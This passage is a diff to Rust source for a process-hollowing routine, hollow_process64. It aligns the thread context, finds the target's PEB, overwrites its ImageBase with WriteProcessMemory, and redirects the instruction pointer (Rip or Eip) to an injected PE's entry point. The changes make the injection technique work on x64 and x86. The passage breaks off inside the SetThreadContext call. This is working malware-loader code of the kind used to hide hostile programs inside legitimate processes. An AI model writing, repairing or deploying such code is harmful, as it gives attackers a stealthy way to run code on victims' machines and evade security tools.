@@ -90,38 +90,126 @@ fn hollow_process64(pe_data: &[u8], target_path: &str, verbose: bool) -> Result<
     // Write PE headers
     write_pe_to_process(process_info.hProcess, remote_base, pe_data, nt_header, verbose)?;
 
-    // Get thread context to update entry point
-    let mut context: CONTEXT = unsafe { mem::zeroed() };
-    context.ContextFlags = CONTEXT_FLAGS(0x10001F); // CONTEXT_FULL
+    // Get thread context to update PEB
+    // IMPORTANT: CONTEXT structure must be 16-byte aligned for x64
+    #[repr(align(16))]
+    struct AlignedContext {
+        context: CONTEXT,
+    }
+    
+    let mut aligned = AlignedContext {
+        context: unsafe { mem::zeroed() },
+    };
+    
+    // For 64-bit: CONTEXT_AMD64 (0x00100000) | CONTEXT_FULL (0x0010007)
+    aligned.context.ContextFlags = CONTEXT_FLAGS(0x00100000 | 0x0010007);
+
+    if verbose {
+        println!("Getting thread context...");
+    }
 
     unsafe {
-        GetThreadContext(process_info.hThread, &mut context)
+        GetThreadContext(process_info.hThread, &mut aligned.context)
             .map_err(|e| {
                 let _ = CloseHandle(process_info.hProcess);
                 let _ = CloseHandle(process_info.hThread);
                 anyhow::anyhow!("Failed to get thread context: {:?}", e)
             })?;
     }
+    
+    let context = &mut aligned.context;
 
-    // Update entry point register based on architecture
+    if verbose {
+        println!("Thread context obtained successfully");
+    }
+
+    // Update PEB (Process Environment Block) ImageBase
     #[cfg(target_arch = "x86_64")]
     {
-        context.Rcx = (remote_base as u64) + entry_point as u64;
+        // Rdx points to PEB in 64-bit processes
+        let peb_address = context.Rdx as u64;
+        
         if verbose {
-            println!("Setting entry point to: 0x{:X}", context.Rcx);
+            println!("PEB address: 0x{:X}", peb_address);
+        }
+
+        // Read the ImageBase from PEB (offset 0x10 for 64-bit)
+        let image_base_offset = peb_address + 0x10;
+        
+        if verbose {
+            println!("Updating PEB ImageBase at: 0x{:X}", image_base_offset);
+        }
+
+        // Write new ImageBase to PEB
+        let new_image_base = remote_base as u64;
+        unsafe {
+            WriteProcessMemory(
+                process_info.hProcess,
+                image_base_offset as *const std::ffi::c_void,
+                &new_image_base as *const u64 as *const std::ffi::c_void,
+                mem::size_of::<u64>(),
+                None,
+            )
+            .map_err(|e| {
+                let _ = CloseHandle(process_info.hProcess);
+                let _ = CloseHandle(process_info.hThread);
+                anyhow::anyhow!("Failed to update PEB ImageBase: {:?}", e)
+            })?;
+        }
+
+        // Update entry point (RIP register - instruction pointer)
+        let new_entry = (remote_base as u64) + entry_point as u64;
+        context.Rip = new_entry;
+        
+        if verbose {
+            println!("Setting entry point (RIP) to: 0x{:X}", context.Rip);
         }
     }
     
     #[cfg(target_arch = "x86")]
     {
-        context.Eip = (remote_base as u32) + entry_point as u32;
+        // Ebx points to PEB in 32-bit processes
+        let peb_address = context.Ebx as u32;
+        
         if verbose {
-            println!("Setting entry point to: 0x{:X}", context.Eip);
+            println!("PEB address: 0x{:X}", peb_address);
+        }
+
+        // Read the ImageBase from PEB (offset 0x8 for 32-bit)
+        let image_base_offset = peb_address + 0x8;
+        
+        // Write new ImageBase to PEB
+        let new_image_base = remote_base as u32;
+        unsafe {
+            WriteProcessMemory(
+                process_info.hProcess,
+                image_base_offset as *const std::ffi::c_void,
+                &new_image_base as *const u32 as *const std::ffi::c_void,
+                mem::size_of::<u32>(),
+                None,
+            )
+            .map_err(|e| {
+                let _ = CloseHandle(process_info.hProcess);
+                let _ = CloseHandle(process_info.hThread);
+                anyhow::anyhow!("Failed to update PEB ImageBase: {:?}", e)
+            })?;
+        }
+
+        // Update entry point (EIP register - instruction pointer)
+        let new_entry = (remote_base as u32) + entry_point as u32;
+        context.Eip = new_entry;
+        
+        if verbose {
+            println!("Setting entry point (EIP) to: 0x{:X}", context.Eip);
         }
     }
 
+    if verbose {
+        println!("Setting thread context...");
+    }
+
     unsafe {
-        SetThreadContext(process_info.hThread, &context)
+        SetThreadContext(process_info.hThread, context)
             .map_err(|e| {
                 let _ = CloseHandle(process_info.hProcess);
                 let _ = CloseHandle(process_info.hThread);
